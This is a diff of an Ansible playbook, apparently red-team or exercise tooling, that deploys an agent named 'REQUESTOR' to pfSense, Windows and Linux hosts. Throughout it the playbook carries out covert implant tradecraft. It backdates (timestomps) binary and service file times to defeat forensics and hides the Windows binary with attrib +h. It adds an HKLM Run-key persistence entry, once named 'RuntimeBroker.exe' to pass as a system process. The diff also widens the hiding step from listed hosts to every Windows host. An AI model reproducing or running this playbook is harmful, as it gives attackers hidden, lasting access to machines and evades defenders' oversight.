@@ -23,7 +23,7 @@
 
 - name: REQUESTOR | Start service | pfSense
   ansible.builtin.service:
-    name: autounmount
+    name: "{{ pfsense_service_name }}"
     state: started
   when: ansible_facts['os_family'] == "FreeBSD"
 
@@ -31,11 +31,13 @@
   file:
     path: "{{ pfsense_binary }}"
     modification_time: "{{ timestomp_time }}"
+  when: ansible_facts['os_family'] == "FreeBSD"
 
 - name: REQUESTOR | Timestomp service file | pfSense
   file:
     path: "{{ pfsense_service }}"
     modification_time: "{{ timestomp_time }}"
+  when: ansible_facts['os_family'] == "FreeBSD"
 
 
 ######################################################################
@@ -50,14 +52,14 @@
     dest: "{{ windows_binary }}"
   when: ansible_facts['os_family'] == "Windows"
 
-- name: CONSTCTRL | Hide agent | Windows
+- name: REQUESTOR | Hide agent | Windows
   win_command: "attrib +h '{{ windows_binary }}'"
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+  when: ansible_facts['os_family'] == "Windows"
 
 - name: REQUESTOR | Add run key persistence | Windows
   win_regedit: 
     path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
-    name: "RuntimeBroker.exe"
+    name: "{{ windows_binary_name }}"
     data: "cmd.exe /c {{ windows_binary }}"
     type: string
   when: ansible_facts['os_family'] == "Windows"
@@ -86,8 +88,8 @@
 - name: REQUESTOR | Copy service file | Linux
   copy:
     src: requestor.service.linux
-    dest: "{{ linux_servicelinux_service }}"
-    mode: 755
+    dest: "{{ linux_service }}"
+    mode: 644
   when: ansible_os_family in linux_distros
 
 - name: REQUESTOR | Reload Service Damemons | Linux
@@ -111,3 +113,12 @@
   file:
     path: "{{ linux_service }}"
     modification_time: "{{ timestomp_time }}"
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Chmod Service File | Linux
+  ansible.builtin.command: chmod 644 "{{ linux_service }}"
+  when: ansible_os_family in linux_distros
+
+- name: REQUESTOR | Chmod Binary | Linux
+  ansible.builtin.command: chmod 755 "{{ linux_binary }}"
+  when: ansible_os_family in linux_distros
